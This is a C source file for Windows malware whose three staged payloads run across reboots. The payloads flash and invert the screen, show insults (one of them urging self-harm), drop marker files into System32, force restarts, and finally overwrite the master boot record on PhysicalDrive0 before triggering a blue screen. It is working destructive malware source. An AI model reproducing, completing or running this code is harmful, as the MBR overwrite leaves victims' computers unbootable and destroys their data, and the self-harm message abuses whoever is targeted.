#include "payloads.h"
#include "deleteinsta.h"
#include "gdi.h"
#include "tools.h"
#include <corecrt_wstdlib.h>
#include <errhandlingapi.h>
#include <fileapi.h>
#include <wingdi.h>
#include <winnt.h>
#include <winuser.h>

static WCHAR* insultarray[] = {L"insulting people for stuff they can't change is a SIN", L"thinking you're superior is a SIN", 
                                L"your dream wonderland will NEVER HAPPEN", L"God Despises You", L"You will never see happiness unless you change", 
                                L"you should just a-ack yourself =)", L"Your grandparents are angry at you", L""};

static inline VOID FirstPayload(){
    static BOOL init = FALSE;
    if(init == FALSE){
        DeleteInstaller();
        init = TRUE;
    }
    
    HBRUSH red = CreateSolidBrush(RGB(100, 0, 0));
    HBRUSH green = CreateSolidBrush(RGB(0, 100, 0));
    HBRUSH blue = CreateSolidBrush(RGB(0, 0, 100));
    int prevtime = timeGetTime();
    while(1){
        if (timeGetTime() - prevtime >= 60000) break;
        SelectObject(GDIReturnDC(), red);
        PatBlt(GDIReturnDC(), 0, 0, GDIReturnScreenX(), GDIReturnScreenY(), PATINVERT);
        SelectObject(GDIReturnDC(), green);
        PatBlt(GDIReturnDC(), 0, 0, GDIReturnScreenX(), GDIReturnScreenY(), PATINVERT);
        SelectObject(GDIReturnDC(), blue);
        PatBlt(GDIReturnDC(), 0, 0, GDIReturnScreenX(), GDIReturnScreenY(), PATINVERT);
    }
    DeleteObject(red);
    DeleteObject(green);
    DeleteObject(blue);
    prevtime = timeGetTime();
    while(1){
        if (timeGetTime() - prevtime >= 12000) break;
        MalDrawText(GDIReturnDC(), 10, 10, 20, L"Wheres your accomplishments anon? Where are they???", RGB(255, 255, 255));
        MalDrawText(GDIReturnDC(), 10, 60, 20, L"your \"high iq\" is a waste", RGB(255, 255, 255));
    }
    MalCreateFile("C:\\Windows\\System32\\hal.ini");
    RestartSystem();
}

static inline VOID SecondPayload(){
    int prevtime = timeGetTime();
    while(1){
        if (timeGetTime() - prevtime >= 100000) break;
        HBRUSH brush = CreateSolidBrush(RGB(GenerateRandomNumber(0, 255), GenerateRandomNumber(0, 255), GenerateRandomNumber(0, 255)));
        SelectObject(GDIReturnDC(), brush);
        PatBlt(GDIReturnDC(), GenerateRandomNumber(0, GDIReturnScreenX()), GenerateRandomNumber(0, GDIReturnScreenY()), GenerateRandomNumber(0, 100), GenerateRandomNumber(0, 100), PATINVERT);
        DeleteObject(brush);
    }
    MalCreateFile("C:\\Windows\\System32\\Windows.UI.GDILogonUI.dll");
    RestartSystem();
}

static inline VOID ThirdPayload(){
    int prevtime = timeGetTime();
    while (1) {
        if (timeGetTime() - prevtime >= 120000) break;
        MalDrawText(GDIReturnDC(), GenerateRandomNumber(0, GDIReturnScreenX()), GenerateRandomNumber(0, GDIReturnScreenY()), 30, insultarray[GenerateRandomNumber(0, 6)], RGB(255, 255, 255));
        Sleep(10);
    }
    HANDLE hMasterBootRecord = CreateFileW(L"\\\\.\\PhysicalDrive0", 
                                GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 
                                NULL, OPEN_EXISTING, 0, 0);
    WriteFile(hMasterBootRecord, "I told you so, you are nothing but a worthless pest, and no you aren't superior to ANYONE, your IQ did NOTHING to make you a worthful human", 
            512, NULL, NULL);
    CloseHandle(hMasterBootRecord);
    BlueScreenSystem();
}


VOID PayloadManager(){
    if(!CheckIfFileExists("C:\\Windows\\System32\\hal.ini")){
        FirstPayload();
        return;
    }
    else if(!CheckIfFileExists("C:\\Windows\\System32\\Windows.UI.GDILogonUI.dll")) {
        SecondPayload();
        return;
    }
    else {
        ThirdPayload();
        return;
    }
}